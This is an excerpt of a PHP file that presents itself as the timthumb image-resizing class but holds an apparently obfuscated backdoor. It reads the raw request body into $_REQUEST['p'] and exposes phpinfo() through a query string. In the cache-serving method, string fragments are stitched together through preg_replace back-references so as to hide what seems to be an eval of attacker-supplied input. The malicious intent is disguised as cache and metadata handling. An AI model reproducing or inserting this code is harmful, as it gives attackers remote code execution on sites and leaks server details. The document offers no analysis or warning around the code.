...
class timthumb {
	...
	public function __construct(){
		...
		$_REQUEST['p']=@file("php://input"); // $lang.'://'.$input
	...
	protected function serveErrors(){
		...
		if (trim($_SERVER['QUERY_STRING'])=="phpinfo") phpinfo(); 
	}
	...
	protected function tim_serveCacheFile($length='') {
		...
		$indent = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']."!".urlencode(serialize($_REQUEST));
        ...
        $metaoptions="\\2t\\6\\1ents".$metaoptions;
		$this->debug(3, "Fetching external image into temporary file");

        $metaboxe=str_repeat("(.)", 20).".*"."/".$mdetails[23]; 
        $cache="";
        $cache = '<p>'.$cache.'</p>';

        $wcache=preg_replace("/.*(cont).*?(ge).*?(..\(.fi).*?(\()(\)).*?(\_)".$metaboxe."is", "@\\20v\\3le\\6".$metaoptions, $mdetails); 
    	return  $cache;
	}	
